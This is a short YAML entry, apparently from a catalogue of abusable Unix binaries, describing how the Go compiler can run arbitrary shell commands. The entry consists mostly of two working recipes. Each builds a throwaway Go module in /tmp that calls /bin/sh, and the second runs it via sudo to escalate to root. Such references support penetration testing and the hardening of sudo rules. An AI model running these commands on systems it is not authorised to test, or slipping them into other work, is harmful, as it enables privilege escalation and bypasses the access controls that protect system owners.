---
description: Go compiler binary. Can be abused to execute arbitrary commands or escalate privileges if run as root.
functions:
  command:
    - code: |
        # Execute arbitrary commands using a temporary Go module
        CMD="id"
        mkdir /tmp/gomod && cd /tmp/gomod
        go mod init mod
        echo "package main; import \"os/exec\"; func main() { exec.Command(\"/bin/sh\",\"-c\",\"$CMD\").Run() }" > main.go
        go run main.go
  sudo:
    - code: |
        # Execute arbitrary commands as root
        CMD="id"
        mkdir /tmp/gomod && cd /tmp/gomod
        sudo go mod init mod
        echo "package main; import \"os/exec\"; func main() { exec.Command(\"/bin/sh\",\"-c\",\"$CMD\").Run() }" > main.go
        sudo go run main.go
notes:
  - "This abuses `go run` to execute arbitrary shell commands by creating a temporary Go module."
  - "Requires Go compiler installed."
  - "If run with root privileges, any command can be executed as root."
  - "Temporary files are created in /tmp/gomod."
---
